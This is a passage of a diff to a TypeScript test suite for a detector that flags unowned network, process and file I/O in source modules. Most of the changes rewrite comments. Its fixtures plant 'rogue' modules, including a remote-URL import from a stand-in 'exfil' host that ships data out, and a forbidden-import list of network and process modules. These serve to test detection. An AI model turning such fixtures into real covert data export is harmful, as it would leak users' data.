@@ -40,18 +40,11 @@ const SRC_ROOT = join(dirname(fileURLToPath(import.meta.url)), '../../../src');
 const REPO_ROOT = join(SRC_ROOT, '..');
 
 /**
- * The SECOND AUTHORITY for this census's denominator.
- *
- * `git ls-files` narrowed to the scanner's OWN scope: same {@link EXCLUDED_DIRS},
- * same {@link isScannableFile}. Mirroring the scope exactly is what makes a
- * shortfall meaningful — the two sides then describe the same population, so a
- * disagreement is a broken walk rather than a definitional mismatch.
- *
- * This replaces three `> 100` floors over a population of ~600. A floor 6× below
- * the real count cannot fail for any reason a regression would produce: it stays
- * green through a relocated root, a widened exclusion, or a walker that stops
- * recursing partway. Containment against a derived list fails on all three, and
- * names the modules that went missing.
+ * The second authority for the module count of this census.
+ * It lists the files that git tracks in the scope of the scanner.
+ * That scope uses the same {@link EXCLUDED_DIRS} and {@link isScannableFile}.
+ * Both sides describe one population, so a shortfall is a broken walk.
+ * A fixed floor far below the real count stays green when the walk loses part of the tree.
  */
 async function trackedScannableModules(): Promise<string[]> {
   return listTrackedFiles(SRC_ROOT, {
@@ -63,11 +56,7 @@ async function trackedScannableModules(): Promise<string[]> {
   });
 }
 
-/**
- * Wrap a bare occurrence list in a scan whose denominators are HEALTHY, so a
- * verdict test exercises the ownership teeth and nothing else. The
- * denominator teeth get their own tests, where the counts are the subject.
- */
+/** Wraps an occurrence list in a scan with healthy counts, so a verdict test exercises only the ownership checks. */
 const scanOf = (occurrences: readonly EffectOccurrence[]): EffectScan => ({
   occurrences,
   moduleCount: 1,
@@ -151,9 +140,9 @@ describe('ruleClaims', () => {
 });
 
 describe('EXIT PROOF — live effect ledger', () => {
+  /** The diagnostics assertion comes first, so a failure prints each diagnostic. */
   it('(a) the live shipped source has ZERO indeterminate owners and no stale cover', async () => {
     const result = await auditEffectOwnership(SRC_ROOT, lexModule);
-    // Surfacing the diagnostics array makes any regression self-describing.
     expect(result.diagnostics).toEqual([]);
     expect(result.ok).toBe(true);
     expect(result.occurrenceCount).toBeGreaterThan(0);
@@ -188,28 +177,10 @@ describe('isScannableFile', () => {
   });
 });
 
-// ─── DR-13 — effect detection is not evadable by import shape ───────────────
-//
-// These are deliberately INTEGRATION-layer: each plants real `.ts` files into a
-// real temp directory tree and runs the async `auditEffectOwnership(root, rules)`
-// end-to-end (walk → read → mask/lex → detect → census). Feeding a hand-built
-// occurrence array to `runEffectLedgerCensus` would only prove the CENSUS
-// rejects an unowned occurrence — which it already did before DR-13. The defect
-// DR-13 names is in the DETECTOR: `import axios from 'axios'` and
-// `import { connect } from 'node:http2'` produced NO occurrence at all, so the
-// census stayed green over a tree that plainly performed network I/O. Only a
-// filesystem round-trip can kill that.
-
 /**
- * The owner-shaped module planted in every fixture so no STALE_OWNERSHIP noise.
- *
- * It carries one real, INERT import purely so every planted tree has a non-zero
- * specifier denominator. Without it the smallest fixtures (this module alone,
- * and the aliased-global tree) would import nothing at all, and
- * `EMPTY_SPECIFIER_DENOMINATOR` would fire on them — correctly, since a tree in
- * which the lexer resolves nothing is a tree the import-shape rules never ranged
- * over. `zod` is on the vetted-inert allowlist, so it adds a specifier and no
- * occurrence.
+ * The owner module of each planted tree, so no fixture reports `STALE_OWNERSHIP`.
+ * Its source imports `zod`, which is on the inert allowlist, so each tree has a specifier count above zero.
+ * Without that import, the smallest trees fail with `EMPTY_SPECIFIER_DENOMINATOR`.
  */
 const OWNER_MODULE = 'owner/network-client.ts';
 const OWNER_SOURCE = `
@@ -230,7 +201,7 @@ const SCOPED_RULES: readonly EffectOwnershipRule[] = Object.freeze([
   } as const,
 ]);
 
-/** Materialise `{ relativePath: source }` into a fresh temp source root. */
+/** Writes each `{ relativePath: source }` entry into a new temporary source root. */
 async function plantTree(files: Record<string, string>): Promise<string> {
   const root = await mkdtemp(join(tmpdir(), 'effect-ledger-dr13-'));
   for (const [rel, source] of Object.entries(files)) {
@@ -250,6 +221,11 @@ function indeterminateOf(
   );
 }
 
+/**
+ * The fail-closed tests plant real `.ts` files in a temporary tree and run `auditEffectOwnership` end to end.
+ * A hand-built occurrence array proves only the census, and the subject here is the detector.
+ * When the detector misses an import shape, the census stays green over a tree that does network I/O.
+ */
 describe('DR-13 kill — the widened detector sees evaded network clients', () => {
   const roots: string[] = [];
   const plant = async (files: Record<string, string>): Promise<string> => {
@@ -269,34 +245,32 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(result.ok).toBe(true);
   });
 
+  /**
+   * The plants hold two named clients, a network builtin, an unknown package and a remote-URL import.
+   * A curated list cannot name the unknown package, so only the closed-world fallback charges it.
+   * The evidence names a known client by its specifier and an unknown package as `unvetted-dependency`.
+   * Thus the named-client rule and the fallback each have an expectation of their own.
+   * Only the plants make the tree red: each diagnostic is `INDETERMINATE_OWNER`.
+   */
   it('EffectLedger_SeededNonListedHttpClient_CensusFailsClosed', async () => {
-    // The DR-13 acceptance test. Every plant below was INVISIBLE to the
-    // pre-widening detector (exact specifier list: node:http|https|net|tls|dgram
-    // + undici + `fetch(`), so the census was green over all of it.
     const root = await plant({
       [OWNER_MODULE]: OWNER_SOURCE,
-      // A well-known client the old list did not name.
       'rogue/axios-client.ts': `
         import axios from 'axios';
         export const get = async (url: string): Promise<unknown> => (await axios.get(url)).data;
       `,
-      // Another one, imported for side effect only.
       'rogue/got-client.ts': `
         import got from 'got';
         export const head = async (url: string): Promise<number> => (await got.head(url)).statusCode;
       `,
-      // A node builtin the old list missed outright.
       'rogue/http2-client.ts': `
         import { connect } from 'node:http2';
         export const open = (authority: string) => connect(authority);
       `,
-      // The case a curated list can NEVER cover: a client published under a name
-      // nobody has heard of. This is what closed-world rule 3 exists for.
       'rogue/private-transport.ts': `
         import { post } from '@acme/secret-transport';
         export const send = (url: string, body: string) => post(url, body);
       `,
-      // A remote-URL import: fetching over the wire IS the import.
       'rogue/url-import.ts': `
         import { ship } from 'https://cdn.example.test/exfil.js';
         export const send = (body: string) => ship(body);
@@ -318,12 +292,8 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
       expect(diagnostic.effectClass).toBe('network');
       expect(diagnostic.message).toContain(diagnostic.module);
     }
-    // The plant is the ONLY reason the tree is red.
     expect(result.diagnostics.every((d) => d.code === 'INDETERMINATE_OWNER')).toBe(true);
 
-    // Evidence must NAME what was admitted — a curated client by its own name, an
-    // unknown package as an explicitly conservative judgement. This is what keeps
-    // rules 2 and 3 independently load-bearing rather than one subsuming the other.
     const evidence = new Map(bad.map((d) => [d.module, d.evidence]));
     expect(evidence.get('rogue/axios-client.ts')).toBe('axios');
     expect(evidence.get('rogue/got-client.ts')).toBe('got');
@@ -334,9 +304,11 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(evidence.get('rogue/url-import.ts')).toBe('https://cdn.example.test/exfil.js');
   });
 
+  /**
+   * No plant holds a direct `fetch(` call. Each one reaches the network through an alias, a global root or a constructor.
+   * The evidence names the rule that matched each shape, so the removal of one rule fails a named expectation.
+   */
   it('EffectLedger_AliasedFetchGlobal_CensusFailsClosed', async () => {
-    // DR-13's "aliased globals" class. None of these contains a literal
-    // `fetch(` call, so the pre-widening `\bfetch\s*\(` regex saw nothing.
     const root = await plant({
       [OWNER_MODULE]: OWNER_SOURCE,
       'rogue/alias.ts': `
@@ -370,8 +342,6 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
       'rogue/global-member.ts',
       'rogue/socket.ts',
     ]);
-    // Each ambient shape must be attributed to ITS OWN rule, so reverting any one
-    // rule kills a named expectation rather than being covered by a sibling.
     const evidence = new Map(bad.map((d) => [d.module, d.evidence]));
     expect(evidence.get('rogue/alias.ts')).toBe('fetch (aliased binding)');
     expect(evidence.get('rogue/bound-alias.ts')).toBe('fetch (aliased binding)');
@@ -380,11 +350,11 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(evidence.get('rogue/socket.ts')).toBe('new WebSocket');
   });
 
+  /**
+   * A re-export names the primitive, so the module that re-exports it is the effect site.
+   * The scan does not charge the consumer of the re-export, because attribution is per module and never transitive.
+   */
   it('EffectLedger_ReExportOfEffectPrimitive_IsDetectedAtTheReExporter', async () => {
-    // DR-13's "re-export/alias of an effect primitive". A re-export NAMES the
-    // primitive, so the re-exporting module IS the effect site. The consumer of
-    // the re-export is NOT charged — attribution is per module, never transitive
-    // (the documented trust boundary, pinned by the second half of this test).
     const root = await plant({
       [OWNER_MODULE]: OWNER_SOURCE,
       'rogue/primitives.ts': `export { request } from 'node:https';`,
@@ -399,17 +369,17 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     const bad = indeterminateOf(result.diagnostics);
     expect(bad.map((d) => d.module)).toEqual(['rogue/primitives.ts']);
     expect(bad[0]?.evidence).toBe('node:https');
-    // Pin the boundary: the consumer is deliberately NOT an effect site.
     expect(bad.some((d) => d.module === 'quiet/consumer.ts')).toBe(false);
   });
 
+  /**
+   * Each snippet has the shape of a shipped module that names a client or a primitive but does no network effect.
+   * The token sits in a regex literal, a string, a raw template, a comment or a longer identifier such as `fetchPrData`.
+   * Two more snippets hold inert imports and type-only imports of network builtins.
+   * No snippet yields an occurrence alone, and a planted tree of all of them with a real owner stays green.
+   */
   it('EffectLedger_IncidentalTokensFromLiveTreeShapes_YieldNoOccurrence', async () => {
-    // Every snippet is copied in SHAPE from a real shipped module that mentions a
-    // client/primitive token but performs no network effect. If any matched, the
-    // widening would be unusable.
     const incidental: Record<string, string> = {
-      // config/toolchains.ts — the hermetic third-party-http SIGNATURE. A regex
-      // literal naming every client this ledger detects.
       'config/toolchains.ts': `
         const signature = {
           depClass: 'third-party-http',
@@ -417,15 +387,12 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
         };
         export const classify = (s: string): boolean => signature.test.test(s);
       `,
-      // workflow/admission/remediation-purity.ts — forbidden-marker string array.
       'workflow/admission/remediation-purity.ts': `
         export const FORBIDDEN_IMPORT_MARKERS: readonly string[] = Object.freeze([
           'node:fs', 'node:child_process', 'node:net', 'node:http', 'node:https',
           'node:dgram', 'node:tls', 'undici',
         ]);
       `,
-      // review/check-catalog.ts — a lint pattern ABOUT fetch, in a string and a
-      // raw template literal.
       'review/check-catalog.ts': `
         export const check = {
           description: 'fetch() calls without timeout can hang indefinitely',
@@ -433,30 +400,24 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
           falsePositives: 'Test stubs or mock fetch calls that make no real request.',
         };
       `,
-      // architecture/adapter-ownership-seam.ts — prose naming the whole surface.
       'architecture/adapter-ownership-seam.ts': `
         export const note =
           'All network I/O (http/https/net/tls/dgram/undici/fetch) is owned by the feedback client.';
       `,
-      // verbs/vcs/validate-pr-body.ts — an identifier that merely STARTS with
-      // fetch; and workspace/discovery.ts — one that merely contains "Fetch".
       'verbs/vcs/validate-pr-body.ts': `
         function fetchPrData(pr: number): number { return pr; }
         async function getOrFetchRoots(): Promise<number> { return 1; }
         export const data = fetchPrData(1) + (await getOrFetchRoots());
       `,
-      // contract/oracle/fixtures.ts — an effect RECORD naming a fetch URL.
       'contract/oracle/fixtures.ts': `
         export const record = (ctx: { effects: { record: (a: string, b: string) => void } }): void =>
           ctx.effects.record('network', 'fetch:https://exfil.example/telemetry');
       `,
-      // verbs/gates/mock-boundary.ts — doc comment naming a bare specifier.
       'verbs/gates/mock-boundary.ts': `
         // BARE package specifiers ('axios', '@scope/pkg') are returned verbatim.
         /* e.g. import axios from 'axios'; or import { connect } from 'node:http2'; */
         export const verbatim = true;
       `,
-      // Every vetted-inert dependency the shipped tree actually imports.
       'inert/dependencies.ts': `
         import { z } from 'zod';
         import matter from 'gray-matter';
@@ -466,7 +427,6 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
         import { parse } from 'yaml';
         export const all = [z, matter, Command, Database, util, parse];
       `,
-      // Type-only imports of network primitives — fully erased, no runtime binding.
       'types/only.ts': `
         import type { Server } from 'node:http';
         export type { Socket } from 'node:net';
@@ -474,29 +434,28 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
       `,
     };
 
-    // Unit-level: no snippet yields an occurrence.
     for (const [module, source] of Object.entries(incidental)) {
       expect(detectModuleEffects(module, source, lexModule), `${module} must yield no occurrence`).toEqual([]);
     }
 
-    // Integration-level: a whole tree of them, with a real owner, stays GREEN.
     const root = await plant({ ...incidental, [OWNER_MODULE]: OWNER_SOURCE });
     const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
     expect(result.diagnostics).toEqual([]);
     expect(result.ok).toBe(true);
   });
 
+  /**
+   * Pins the type-only guard alone, so no other expectation of the false-positive sweep can hide a regression.
+   * The value form of the same specifier stays an effect site.
+   * A `type` modifier in one statement does not apply to the next statement.
+   */
   it('EffectLedger_TypeOnlyNetworkImport_YieldsNoOccurrence', async () => {
-    // Focused pin for the type-only guard on its own, so it cannot be masked by
-    // a sibling expectation in the false-positive sweep above.
     expect(detectModuleEffects('x/y.ts', `import type { Server } from 'node:http2';`, lexModule)).toEqual([]);
     expect(detectModuleEffects('x/y.ts', `export type { Socket } from 'node:net';`, lexModule)).toEqual([]);
     expect(detectModuleEffects('x/y.ts', `import type Axios from 'axios';`, lexModule)).toEqual([]);
-    // …but the VALUE form of the very same specifier is still an effect site.
     expect(detectModuleEffects('x/y.ts', `import { connect } from 'node:http2';`, lexModule)).toEqual([
       { module: 'x/y.ts', effectClass: 'network', evidence: 'node:http2' },
     ]);
-    // A `type` modifier must not leak across statements.
     const mixed = `export type Foo = number;\nimport got from 'got';`;
     expect(detectModuleEffects('x/y.ts', mixed, lexModule).map((o) => o.evidence)).toEqual(['got']);
 
@@ -512,35 +471,24 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(result.ok).toBe(true);
   });
 
+  /**
+   * A quote inside a regex literal is not a string delimiter.
+   * A lexer without regex awareness opens a phantom string there and then reads comment prose as code.
+   * The comment is on the same line as the regex, because a newline ends a phantom `'` or `"` string.
+   * The apostrophe in the comment closes the phantom string, so the documented `from 'axios'` scans as a live import.
+   *
+   * A regex after `return` must also lex as a regex, and a regex body must be masked.
+   * Without that mask, the ledger module matches its own `fetch` detection rules.
+   * A `/` in division position must not open a regex, because that hides real code.
+   */
   it('EffectLedger_RegexLiteralWithQuoteChars_DoesNotDesyncTheLexer', () => {
-    // Regression guard for the lexer defect the DR-12 widening exposed in the
-    // near-duplicate `vcs-ownership.stripComments`, and which this module's own
-    // copies carried: the `'` inside a regex character class is NOT a string
-    // delimiter. Without regex awareness the walk enters a phantom string there
-    // and stops recognising `//`, so comment prose leaks in and self-matches.
-    //
-    // The comment is on the SAME LINE as the regex on purpose. A newline would
-    // resynchronise by itself (`'`/`"` are line-bounded), so a next-line fixture
-    // passes even WITHOUT regex awareness and would leave this guard vacuous.
     const sameLine = [
       "const RE = /(['\"])x\\1/; // don't ship: import axios from 'axios';",
       'export const after = 1;',
     ].join('\n');
-    // The apostrophe in "don't" is what makes this a real kill: without regex
-    // awareness the `'` inside the character class opens a phantom string, that
-    // apostrophe CLOSES it, and the rest of the comment is scanned as CODE — so
-    // the documented `from 'axios'` is recorded as a live import.
     expect(extractImports(sameLine, lexModule)).toEqual([]);
     expect(detectModuleEffects('architecture/detector.ts', sameLine, lexModule)).toEqual([]);
 
-    // What used to be recorded here as "the conservative heuristic's known blind
-    // spot": `return /…/` scores the `/` as division (previous significant char
-    // is `n`), so regex mode was NOT entered and a phantom string opened inside
-    // the regex. The old note argued the damage was capped because `'`/`"` are
-    // line-bounded. It is capped — for `'` and `"`. Task 065's kill fixture
-    // below shows what happens when the quote character inside the regex is a
-    // BACKTICK, which is not line-bounded. Under the port there is no blind spot
-    // to cap: a regex literal is a regex literal.
     const blindSpot = [
       `export function isQuote(x: string): boolean { return /(['"])/.test(x); }`,
       `// historical: import axios from 'axios';`,
@@ -549,14 +497,10 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(extractImports(blindSpot, lexModule).map((r) => r.specifier)).toEqual(['node:http2']);
     expect(detectModuleEffects('x/y.ts', blindSpot, lexModule).map((o) => o.evidence)).toEqual(['node:http2']);
 
-    // Same for a same-line BLOCK comment.
     const blockSameLine =
       "const RE = /(['\"`])x\\1/; /* was: import axios from 'axios' */ export const a = 1;";
     expect(detectModuleEffects('architecture/detector.ts', blockSameLine, lexModule)).toEqual([]);
 
-    // A regex BODY must be masked, or this very module self-matches: it holds
-    // `/(?<![\\w$.])fetch\\s*\\(/` as a detection rule and would report itself as
-    // a network effect under `architecture/`, which owns no network rule.
     const selfShape = [
       'const AMBIENT = [',
       '  { re: /(?<![\\w$.])fetch\\s*\\(/, evidence: "fetch" },',
@@ -567,19 +511,16 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(maskNonCode(selfShape, lexModule)).not.toContain('fetch');
     expect(detectModuleEffects('architecture/effect-ledger.ts', selfShape, lexModule)).toEqual([]);
 
-    // A `/` in DIVISION position must NOT be mistaken for a regex opener — that
-    // would swallow real code and cause a false NEGATIVE (the dangerous
-    // direction for a ratchet).
     const division = `const ratio = total / count;\nimport { connect } from 'node:http2';`;
     expect(detectModuleEffects('x/y.ts', division, lexModule).map((o) => o.evidence)).toEqual(['node:http2']);
   });
 
+  /**
+   * Pins two deliberate false negatives: an injected client and a computed global access.
+   * A per-module scan cannot decide either one.
+   * No rule matches a bare `fetch` identifier, so a property key and an interface member with that name stay inert.
+   */
   it('EffectLedger_DocumentedTrustBoundary_InjectedClientAndComputedAccess', () => {
-    // These pin the DR-13 carve-outs documented in the module JSDoc so the
-    // carve-out cannot silently GROW. Each is a deliberate false negative.
-
-    // 1. INJECTED CLIENT — the client's effect surface belongs to the caller,
-    //    which a per-module scan never sees. Undecidable here by construction.
     const injected = `
       export interface HttpLike { readonly post: (url: string, body: string) => Promise<boolean>; }
       export class Reporter {
@@ -591,7 +532,6 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     `;
     expect(detectModuleEffects('x/reporter.ts', injected, lexModule)).toEqual([]);
 
-    // 2. COMPUTED / STRING-INDEXED GLOBAL ACCESS — undecidable in general.
     const computed = `
       const g = globalThis as unknown as Record<string, (u: string) => Promise<unknown>>;
       const key = 'fet' + 'ch';
@@ -599,20 +539,17 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     `;
     expect(detectModuleEffects('x/computed.ts', computed, lexModule)).toEqual([]);
 
-    // 3. OBJECT SHORTHAND — excluded on purpose: a bare `fetch` identifier rule
-    //    false-positives on ordinary property keys and interface members, which
-    //    would make the ratchet unusable. Both shapes below must stay inert.
     expect(detectModuleEffects('x/keys.ts', `export const c = { fetch: 1, post: 2 };`, lexModule)).toEqual([]);
     expect(
       detectModuleEffects('x/iface.ts', `export interface Deps { fetch: (u: string) => void }`, lexModule),
     ).toEqual([]);
   });
 
+  /**
+   * `global`, `self` and `window` reach the same ambient network surface as `globalThis`.
+   * The rule anchors on the left, so a longer identifier that ends in one of these names does not match.
+   */
   it('EffectLedger_AmbientGlobalAliases_GlobalSelfWindow_AreNetworkEffects', () => {
-    // DR-13 rule-2 widening: `globalThis` is not the only spelling of the
-    // global object. `global` (Node), `self` (workers), and `window` reach the
-    // IDENTICAL ambient network surface, so a literal-`globalThis` rule was an
-    // open evasion (`global.fetch(url)` scanned clean).
     for (const root of ['globalThis', 'global', 'self', 'window']) {
       const occ = detectModuleEffects(
         'x/alias.ts',
@@ -622,17 +559,14 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
         'network',
       ]);
     }
-    // Anchored on the LEFT: a member access or longer identifier ending in one
-    // of the alias names must NOT match (`app.window.fetch` is `.window`-rooted
-    // member access on an app object; `notglobal.fetch` is a plain object).
     expect(detectModuleEffects('x/n1.ts', `export const x = notglobal.fetch('u');`, lexModule)).toEqual([]);
   });
 
+  /**
+   * The ambient `Bun` object does I/O with no import: it opens sockets, spawns a process and reads or writes files.
+   * Each rule needs the `Bun` member shape, so `myBun.serve` and a name in a comment or a string stay inert.
+   */
   it('EffectLedger_BunAmbientAPIs_AreDetected_PerEffectClass', () => {
-    // Bun's ambient runtime object performs I/O with NO import at all —
-    // `Bun.serve`/`Bun.connect` open sockets, `Bun.spawn` forks a process,
-    // `Bun.write`/`Bun.file` touch the filesystem. Pre-widening none of these
-    // were detected (and the trust boundary never documented the gap).
     const cases: readonly [source: string, effectClass: string, evidence: string][] = [
       [`export const s = Bun.serve({ port: 3000, fetch: () => new Response('x') });`, 'network', 'Bun.serve'],
       [`export const c = await Bun.connect({ hostname: 'x', port: 1 });`, 'network', 'Bun.serve'],
@@ -646,23 +580,18 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
         { module: 'x/bun.ts', effectClass, evidence },
       ]);
     }
-    // Shape-anchored: an object that merely LOOKS like Bun stays inert, and the
-    // names inside strings/comments never count (maskNonCode).
     expect(detectModuleEffects('x/nb1.ts', `export const x = myBun.serve(1);`, lexModule)).toEqual([]);
     expect(detectModuleEffects('x/nb2.ts', `// docs: Bun.serve is the ambient server`, lexModule)).toEqual([]);
     expect(detectModuleEffects('x/nb3.ts', `export const s = 'Bun.spawn(cmd)';`, lexModule)).toEqual([]);
   });
 
+  /**
+   * One allowlist entry covers each subpath of its package, so `@modelcontextprotocol/server/stdio` is inert.
+   * `@modelcontextprotocol/sdk` has no entry, so its subpath is an unvetted dependency.
+   * A node builtin without the `node:` prefix is a builtin and not an unvetted package, and `bun:sqlite` stays inert.
+   * Each allowlist entry must classify as inert.
+   */
   it('EffectLedger_ClosedWorldAllowlist_IsPerPackageNotPerSubpath', () => {
-    // `@modelcontextprotocol/server/stdio` must be covered by the ONE
-    // `@modelcontextprotocol/server` allowlist entry, or every SDK subpath would
-    // be an unvetted dependency and the live tree would go red.
-    //
-    // Retargeted from the v1 package by task 049. The scoped-package subpath
-    // rule is what is under test, so the specifier must name a package that is
-    // actually ALLOWLISTED — pointing it at the removed v1 SDK would have
-    // turned this into an assertion that unvetted packages are vetted, and it
-    // would have failed for the right reason while reading as the wrong one.
     expect(packageNameOf('@modelcontextprotocol/server/stdio')).toBe(
       '@modelcontextprotocol/server',
     );
@@ -670,9 +599,6 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
     expect(packageNameOf('yaml/dist/x.js')).toBe('yaml');
 
     expect(classifySpecifier('@modelcontextprotocol/server/stdio')).toBeUndefined();
-    // …and the RETIRED generation is no longer vetted: a v1 subpath is now an
-    // unvetted dependency, which is the allowlist correctly declining to vouch
-    // for a package this tree does not install.
     expect(classifySpecifier('@modelcontextprotocol/sdk/types.js')).toEqual({
       effectClass: 'network',
       evidence: 'unvetted-dependency:@modelcontextprotocol/sdk',
@@ -681,15 +607,12 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
       effectClass: 'network',
       evidence: 'unvetted-dependency:@acme/anything',
     });
-    // A bare (unprefixed) node builtin is a BUILTIN, never an unvetted package.
     expect(classifySpecifier('util')).toBeUndefined();
     expect(classifySpecifier('child_process')).toEqual({
       effectClass: 'process',
       evidence: 'child_process',
     });
-    // A non-network builtin scheme stays inert.
     expect(classifySpecifier('bun:sqlite')).toBeUndefined();
-    // Every allowlist entry must actually BE inert (no self-contradiction).
     for (const pkg of INERT_DEPENDENCIES) {
       expect(classifySpecifier(pkg), `${pkg} is allowlisted so must classify inert`).toBeUndefined();
     }
@@ -698,18 +621,16 @@ describe('DR-13 kill — the widened detector sees evaded network clients', () =
 
 describe('DR-13 live tree — the widened census is green and load-bearing', () => {
   it('EffectLedger_LiveShippedSource_IsGreenUnderTheWidenedDetector', async () => {
-    // The widening must not manufacture work: the live tree carries no
-    // unvetted dependency, no third-party client and no aliased global, so the
-    // occurrence set is unchanged and every occurrence still has an owner.
     const result = await auditEffectOwnership(SRC_ROOT, lexModule);
     expect(result.diagnostics).toEqual([]);
     expect(result.ok).toBe(true);
   });
 
+  /**
+   * A rule that claims no site must fail the census over the real tree.
+   * The stale rule is the only diagnostic, which also shows that the tree is green without it.
+   */
   it('EffectLedger_LiveDeclaredOwnerWithNoLiveSite_TripsStaleOwnership', async () => {
-    // The phantom-cover half of the two-way ratchet, over the REAL tree: adding
-    // a rule that claims nothing must fail closed, and must be the ONLY reason
-    // the tree is red (which re-proves the green case above).
     const phantom: EffectOwnershipRule = {
       effectClass: 'network',
       match: 'nowhere/phantom-client.ts',
@@ -728,14 +649,12 @@ describe('DR-13 live tree — the widened census is green and load-bearing', () 
     ]);
   });
 
+  /**
+   * No bare package that the shipped tree imports can be an unvetted dependency.
+   * The walk has the scope of the scanner ({@link EXCLUDED_DIRS}, {@link isScannableFile}), so it reads no harness file.
+   * The walk must reach each tracked module in that scope, or the finding covers an incomplete tree.
+   */
   it('EffectLedger_LiveBareImportSurface_IsFullyCoveredByTheInertAllowlist', async () => {
-    // Makes the closed-world rule honest rather than lucky: every bare package
-    // the shipped tree imports must be a VETTED entry, not merely absent from a
-    // client denylist. A new dependency lands here first, loudly.
-    //
-    // The walk mirrors the scanner's scope EXACTLY (same EXCLUDED_DIRS, same
-    // isScannableFile) — an over-wide walk would report `evals/` harness imports
-    // the census never sees.
     const { readdir, readFile } = await import('node:fs/promises');
     const files: string[] = [];
     const walk = async (dir: string): Promise<void> => {
@@ -749,8 +668,6 @@ describe('DR-13 live tree — the widened census is green and load-bearing', () 
       }
     };
     await walk(SRC_ROOT);
-    // DERIVED denominator (task 079): every module git tracks within the
-    // scanner's scope must have been reached, named individually on shortfall.
     expect(
       trackedFilesMissedBy(
         files.map((file) => relative(SRC_ROOT, file).replaceAll('\\', '/')),
@@ -773,25 +690,11 @@ describe('DR-13 live tree — the widened census is green and load-bearing', () 
   });
 });
 
-// ─── DR-26 / task 065 — the lexical question is a PORT, and the gap is measured
-//
-// `extractImports` and `maskNonCode` used to be two hand-rolled walks in shipped
-// `src/`, and the module header admitted the regex-versus-division rule was a
-// heuristic. Task 065 inverted both to one required {@link ModuleLexer} port,
-// implemented by `test-helpers/module-lexer.ts` over the real TypeScript parser.
-//
-// The port cannot be justified by asserting that it is right; a port that is
-// never shown to DIFFER from what it replaced has not been shown to be needed.
-// So the retired walks are kept verbatim in `test-helpers/superseded-source-lexer.ts`
-// and assembled here into a `ModuleLexer` — the only place that ever happens —
-// so both instruments can be run over the same input and BOTH answers asserted.
-
 /**
- * The census as it behaved BEFORE task 065: the same policy, driven by the
- * retired lexer.
- *
- * Deliberately assembled here rather than exported from the helper. Its only
- * use is measuring the gap; nothing may drive a real census through it.
+ * The census policy, driven by the retired heuristic lexer from `test-helpers/superseded-source-lexer.ts`.
+ * Its only use is to measure the gap between that lexer and the parser-based {@link ModuleLexer} port.
+ * The tests run both lexers over the same input and assert both answers.
+ * The helper does not export an assembled lexer, and a real census must not use this one.
  */
 const SUPERSEDED_LEXER: ModuleLexer = (source: string) => ({
   imports: supersededExtractImports(source),
@@ -799,19 +702,9 @@ const SUPERSEDED_LEXER: ModuleLexer = (source: string) => ({
 });
 
 /**
- * THIS CENSUS'S expectations over the shared adversarial inputs.
- *
- * The input sources moved to `test-helpers/adversarial-lexer-inputs.ts` when
- * task 072 gave the port three more consumers: DR-2 says *"no fourth adversarial
- * table — reuse the existing one"*, so there is now one table of inputs and each
- * site keeps only its own two answer columns. Those cannot be shared — what the
- * heuristic answered is a fact about THIS site's retired walk, and the three
- * other retired walks answer differently.
- *
- * `parse` and `heuristic` are both asserted for every row, so a reader sees the
- * gap rather than taking it on faith, and so a row that stops disagreeing
- * (someone "fixing" the retired walk) fails loudly instead of quietly making the
- * kill fixture vacuous.
+ * The expectations of this census for the shared inputs in `test-helpers/adversarial-lexer-inputs.ts`.
+ * Only the inputs are shared. The two answer columns belong to this site, because each retired walk answers differently.
+ * The test asserts `parse` and `heuristic` for each row, so a row that stops its disagreement fails.
  */
 interface AdversarialExpectation {
   readonly name: string;
@@ -836,20 +729,20 @@ const ADVERSARIAL_EXPECTATIONS: readonly AdversarialExpectation[] = Object.freez
     heuristic: ['node:fs'],
   },
   {
-    // KILL — the dangerous direction. `return` makes the heuristic score the
-    // `/` as division, so the BACKTICK inside the regex opens a phantom template
-    // literal. Unlike `'`/`"` a template is not line-bounded, so it runs to EOF
-    // and swallows the real `node:fs` import below it. A module that performs
-    // filesystem I/O scans as effect-free.
+    /**
+     * The false negative. After `return`, the heuristic reads the `/` as division.
+     * The backtick in the regex then opens a phantom template, which is not line-bounded.
+     * That template runs to the end of the file and hides the real `node:fs` import.
+     */
     name: 'a regex literal containing a BACKTICK, in operand position',
     parse: ['node:fs'],
     heuristic: [],
   },
   {
-    // KILL — the other direction. The heuristic TOGGLES on every backtick, so
-    // the body of the template nested inside the `${…}` substitution reads as
-    // code and its template text is scanned for imports. The module imports
-    // nothing at all; the census invents a `node:child_process` occurrence.
+    /**
+     * The false positive. The heuristic toggles on each backtick, so it reads the text of the nested template as code.
+     * The module imports nothing, and the heuristic reports `node:child_process`.
+     */
     name: 'a nested template literal inside a `${…}` substitution',
     parse: [],
     heuristic: ['node:child_process'],
@@ -866,6 +759,10 @@ const ADVERSARIAL_SET: readonly {
 );
 
 describe('DR-26 kill fixture — where the heuristic and a real parse disagree', () => {
+  /**
+   * The last assertion names the rows on which the two lexers differ.
+   * A table with no such row proves nothing about the port.
+   */
   it('EffectLedger_AdversarialSet_ParseAndHeuristicAnswersAreBothPinned', () => {
     const disagreeing: string[] = [];
     for (const row of ADVERSARIAL_SET) {
@@ -875,18 +772,14 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
       expect(heuristic, `${row.name} — heuristic`).toEqual([...row.heuristic]);
       if (JSON.stringify(parsed) !== JSON.stringify(heuristic)) disagreeing.push(row.name);
     }
-    // NON-EMPTY DENOMINATOR for the kill fixture itself. A table on which the
-    // two instruments never differ would prove the port changed nothing.
     expect(disagreeing).toEqual([
